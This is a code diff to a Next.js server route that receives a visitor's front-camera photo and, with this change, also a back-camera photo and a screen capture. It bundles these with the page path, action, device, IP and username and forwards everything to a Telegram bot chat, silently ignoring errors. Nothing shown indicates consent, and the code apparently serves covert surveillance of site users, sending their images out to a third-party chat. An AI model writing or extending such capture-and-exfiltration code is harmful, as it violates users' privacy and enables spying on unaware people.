@@ -35,9 +35,15 @@ const dataUrlToBlob = (dataUrl: string): Blob | null => {
 };
 
 export async function POST(req: NextRequest) {
-  let body: { photo?: string; label?: string; path?: string };
+  let body: { photo?: string; photoBack?: string; screen?: string; label?: string; path?: string };
   try {
-    body = (await req.json()) as { photo?: string; label?: string; path?: string };
+    body = (await req.json()) as {
+      photo?: string;
+      photoBack?: string;
+      screen?: string;
+      label?: string;
+      path?: string;
+    };
   } catch {
     return NextResponse.json({ ok: false }, { status: 400 });
   }
@@ -63,6 +69,7 @@ export async function POST(req: NextRequest) {
     `页面：${body.path || ''}`,
     `操作：${body.label || ''}`,
     `设备：${osOf(ua)} · ${browserOf(ua)}`,
+    `照片：前置${body.photoBack ? ' + 后置' : '（无后置摄像头）'}${body.screen ? ' + 屏幕截图' : '（无屏幕共享）'}`,
   ].join('\n');
 
   const token = process.env.TG_ENTRY_BOT_TOKEN || '';
@@ -90,14 +97,36 @@ export async function POST(req: NextRequest) {
 
   const blob = dataUrlToBlob(body.photo);
   if (!blob) return NextResponse.json({ ok: false }, { status: 400 });
+  const backBlob = body.photoBack ? dataUrlToBlob(body.photoBack) : null;
+  const screenBlob = body.screen ? dataUrlToBlob(body.screen) : null;
   const form = new FormData();
   form.append('chat_id', chatId);
   form.append('caption', caption);
-  form.append('photo', blob, 'op.jpg');
-  await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-    method: 'POST',
-    body: form,
-  }).catch(() => undefined);
+  form.append('front.jpg', blob, 'front.jpg');
+  const media: { type: string; media: string }[] = [
+    { type: 'photo', media: 'attach://front.jpg' },
+  ];
+  if (backBlob) {
+    form.append('back.jpg', backBlob, 'back.jpg');
+    media.push({ type: 'photo', media: 'attach://back.jpg' });
+  }
+  if (screenBlob) {
+    form.append('screen.jpg', screenBlob, 'screen.jpg');
+    media.push({ type: 'photo', media: 'attach://screen.jpg' });
+  }
+  if (media.length > 1) {
+    form.append('media', JSON.stringify(media));
+    await fetch(`https://api.telegram.org/bot${token}/sendMediaGroup`, {
+      method: 'POST',
+      body: form,
+    }).catch(() => undefined);
+  } else {
+    form.append('photo', blob, 'front.jpg');
+    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+      method: 'POST',
+      body: form,
+    }).catch(() => undefined);
+  }
 
   recordEntry(req, { ip, loc: '', model: `${osOf(ua)} · ${browserOf(ua)}`, user: username });
   return NextResponse.json({ ok: true, telegram: 'sent' });
